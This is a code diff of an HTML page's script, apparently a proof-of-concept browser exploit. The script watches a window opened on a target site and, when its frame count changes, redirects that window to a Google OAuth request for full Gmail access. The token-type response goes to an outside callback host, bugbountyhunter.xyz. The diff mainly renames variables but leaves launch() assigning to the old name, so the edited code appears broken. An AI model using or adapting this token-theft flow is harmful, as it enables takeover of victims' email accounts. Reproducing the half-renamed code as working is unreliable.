@@ -43,8 +43,7 @@
         }
     </style>
     <script>
-        // Get the URL parameter
-        function getParameterByName(name, target) {
+        function getParamName(name, target) {
             if (!target) target = window.location.href;
             name = name.replace(/[\[\]]/g, "\\$&");
             var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
@@ -54,28 +53,31 @@
             return decodeURIComponent(results[2].replace(/\+/g, " "));
         }
 
-        let foo;
-        let baselength;
-        var urlParam = getParameterByName('target');
+        let hunter;
+        let b_length;
+        var urlParam = getParamName('target');
+        
         function init() {
-            baselength = foo.length;
-            console.log("Setting base to " + baselength);
+            b_length = hunter.length;
+            console.log("Setting baselength to " + b_length);
             watch();
         }
+        
         function watch() {
-            if (foo.length != baselength) {
-                console.log("baselength: " + baselength);
-                console.log("foo.length " + foo.length);
+            if (hunter.length != b_length) {
+                console.log("b_length: " + b_length);
+                console.log("hunter.length: " + hunter.length);
                 console.log('Google navigation');
-                foo.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id=92872884978-fd7hoogqudduc5eutv400o6rj3tdcj0h.apps.googleusercontent.com&redirect_uri=https://bugbountyhunter.xyz/callback.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+                hunter.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id=92872884978-fd7hoogqudduc5eutv400o6rj3tdcj0h.apps.googleusercontent.com&redirect_uri=https://bugbountyhunter.xyz/callback.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
             } else {
-                console.log("watch(): " + foo.length + " / " + baselength);
+                console.log("watch(): " + hunter.length + " / " + b_length);
                 setTimeout(watch, 1);
             }
         }
+
         function launch() {
-            foo = window.open(urlParam, "foo", "");
-            setTimeout(init, 1200);
+            foo = window.open(urlParam, "hunter", "");
+            setTimeout(init, 2000);
         }
     </script>
 </head>
